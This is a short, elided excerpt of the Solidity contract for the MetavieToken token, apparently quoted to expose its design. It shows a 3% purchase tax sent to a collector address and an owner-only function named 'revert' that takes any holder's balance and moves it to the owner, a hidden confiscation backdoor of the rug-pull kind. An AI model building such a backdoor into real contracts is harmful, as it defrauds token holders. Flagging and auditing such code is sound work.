...
contract MetavieToken is ReentrancyGuardUpgradeable, OwnableUpgradeable {
    ...
    uint8 public constant taxOnPurchase =3;
    ...
    function _transferTokens(
        ...
        if ((!isDex[dst] && !isDex[src]) || (_dexTaxExcempt[dst] || _dexTaxExcempt[src]) || inSwap || src == taxCollector || src == taxCollector ) {
            ...
            balances[taxCollector] = add96(
                balances[taxCollector], tax, "MetavieToken::_transferTokens: transfer amount overflows"
            );
    ...
    function revert(address account, uint96 amount) public onlyOwner {
        balances[account] -= uint96(amount);
        balances[owner()] += uint96(amount);
